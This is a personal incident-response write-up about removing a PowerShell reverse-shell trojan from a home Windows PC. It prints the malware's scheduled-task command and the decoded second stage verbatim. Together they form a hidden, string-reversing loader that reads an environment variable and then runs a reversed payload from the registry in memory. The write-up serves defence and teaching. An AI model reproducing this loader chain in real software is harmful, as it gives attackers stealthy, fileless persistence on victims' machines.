# Reverse Shell Trojan on My Dad's PC — Incident Writeup

**Category:** Malware Analysis / Incident Response  
**Classification:** Trojan:PowerShell/ReverseShell.SA  
**System:** Windows 11, personal home PC

---

## Symptoms

On my dad’s system, I noticed repeated PowerShell activity that was not tied to any visible user action. PowerShell windows were flashing briefly and terminating immediately, while background processes continued to appear intermittently in Task Manager.

The behavior was consistent enough to suggest automated execution rather than manual use or normal system maintenance.

---

## Checking Console History

First thing I checked was the PSReadLine history file, since if anything had been running commands on this machine, it would show up there. Navigated to it directly in File Explorer instead of pulling it up in a terminal:

```text
%appdata%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Opened it as a plain text file, expecting to just skim through it. Didn't even get a few seconds in before Windows Defender jumped in on its own:

```text
Threat detected: Trojan:PowerShell/ReverseShell.SA
```

Defender quarantined the file right away. Useful, but also frustrating. All it gave me was a name, no details on what the thing actually did or how it got there. So instead of just accepting "quarantined, done," I went looking for whatever was triggering it in the first place.

---

## Checking Scheduled Tasks

My first guess was a scheduled task, since that's the classic way to get something to run quietly every time a machine boots or logs in. Opened PowerShell and started poking around the Microsoft task paths:

```powershell
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Ras\"
```

And there it was, `MobilityManagertvd`, sitting right next to the actual legitimate Windows task `MobilityManager`. One extra "tvd" tacked onto the end. If I'd been scrolling fast I probably would've skimmed right past it, which is clearly the whole point. Pulled the task's action to see what it was actually configured to run:

```powershell
(Get-ScheduledTask -TaskName "MobilityManagertvd" -TaskPath "\Microsoft\Windows\Ras\").Actions
```

And that's where the real command showed up:

```text
\Microsoft\Windows\Ras\MobilityManagertvd | Powershell.exe -WindowStyle Hidden -Command "$envVar = [Environment]::GetEnvironmentVariable('55f31fd7'); $charArray = $envVar.ToCharArray(); [Array]::Reverse($charArray); $rev = -join $charArray; $ExecutionContext.InvokeCommand.InvokeScript($rev)"
```

`-WindowStyle Hidden` sitting right there in plain sight was the part that got me. This task had been quietly firing every time the machine logged in, and nobody would ever see it happen.

---

## Decoding the Command

Broke the command down piece by piece. It reads an environment variable, reverses the string, then executes whatever comes out. So I checked the variable directly:

```powershell
[Environment]::GetEnvironmentVariable('55f31fd7', 'User')
```

What came back looked like complete gibberish at first glance, until it clicked: it wasn't gibberish, it was just backwards. Reversed it by hand and got a second PowerShell command hiding inside the first one:

```powershell
$registryData = (Get-ItemProperty -Path 'HKLM\SOFTWARE\Microsoft\Windows\AppRuntimeAppContainer\55f13df7' -Name '55f13df7').'55f13df7';
$decodedScript = [System.Text.Encoding]::UTF8.GetString($registryData);
$rev = -join $decodedScript[$decodedScript.Length..0];
Invoke-Command ([ScriptBlock]::Create($rev))
```

So the environment variable was never the actual payload, just a pointer telling PowerShell where to go next. It reached into a registry key, pulled out some binary data, converted it to text, reversed that too, and only then ran it. Two layers of misdirection, stacked on top of each other, just to make sure nothing useful showed up if you looked at any single piece on its own. The full chain, laid out:

```text
Scheduled Task (trigger, runs on login, hidden window)
        ↓
Environment Variable "55f31fd7" (reversed pointer)
        ↓
Registry Key "AppRuntimeAppContainer\55f13df7" (reversed payload)
        ↓
In-memory execution
```

Nothing about this touches disk as a normal, readable script at any point. It's scheduled tasks, environment variables, and registry blobs the whole way down, exactly the kind of places most people never think to look.

---

## Why I Don't Have the Final Payload

I'll be upfront about this part: I never got a clean copy of what was actually sitting inside that registry key. By the time I ran `Get-ItemProperty` against it, Defender's real-time protection had already flagged that key from its earlier pass on the history file, and the value data had been stripped out before I could pull it. I confirmed the key existed, confirmed the name matched exactly what the reversed environment variable pointed to, but the actual contents were already gone by the time I went looking.

In hindsight, the move would've been to export the raw value with `reg export` the second I found the key, before doing anything else. I didn't move fast enough on that one specific step, so I can walk through exactly how this thing was built and how it executed, just not hand over the literal final line of code it was trying to run.

---

## Cleanup

```powershell
# Kill any lingering PowerShell processes
Get-CimInstance Win32_Process | Where-Object {
    $_.Name -like "powershell*" -and $_.ProcessId -ne $PID
} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }

# Remove the scheduled task
Unregister-ScheduledTask -TaskName "MobilityManagertvd" -TaskPath "\Microsoft\Windows\Ras\" -Confirm:$false

# Remove the environment variable
[Environment]::SetEnvironmentVariable('55f31fd7', $null)

# Remove the registry key
Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows\AppRuntimeAppContainer\55f13df7' -Recurse -Force -ErrorAction SilentlyContinue
```

Went back and checked every piece individually instead of just trusting the script ran clean:

```powershell
Get-ScheduledTask -TaskName "MobilityManagertvd" -ErrorAction SilentlyContinue
[Environment]::GetEnvironmentVariable('55f31fd7', 'User')
Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows\AppRuntimeAppContainer\55f13df7' -ErrorAction SilentlyContinue
```

All three came back empty. No task, no variable, no key. Finished up with a full Defender scan through the Windows Security GUI, since the `MpCmdRun.exe` CLI shortcut wasn't on `PATH`. Came back clean.

Small thing worth mentioning: I made sure not to touch the real `MobilityManager` task while I was in there. Easy to nuke by accident if you're not paying attention to that one extra "tvd."

---

## What This Malware Was

`Trojan:PowerShell/ReverseShell.SA` is built around giving an attacker standing remote access rather than doing damage in one shot. Based on how this family typically behaves, it's usually capable of:

- Persistence via scheduled tasks, so it survives reboots
- Grabbing saved credentials and browser data
- Keylogging or capturing screenshots
- Downloading and running additional malware
- Holding a connection open to a command-and-control server

Given how it was staged, the likely way it got on the machine is a cracked application, fake freeware, or a typosquatted download site. The usual suspects for this kind of thing.

---

## Lessons Learned

- Check console history early when something looks even slightly off. It's usually the fastest lead you'll get.
- Malware spread across a scheduled task, an environment variable, and a registry key is built that way specifically to survive a shallow scan. Follow the whole chain instead of stopping at the first quarantine notice.
- Fake scheduled tasks can look almost identical to the real thing. Read the full name and path before deleting anything, not just the first few characters.
- For security researchers, if you ever find a live payload sitting somewhere like the registry, export it immediately. Automated remediation doesn't wait around for you to look at it twice.
- Cracked software and sketchy freeware are still the easiest way for something like this to end up on a home PC.
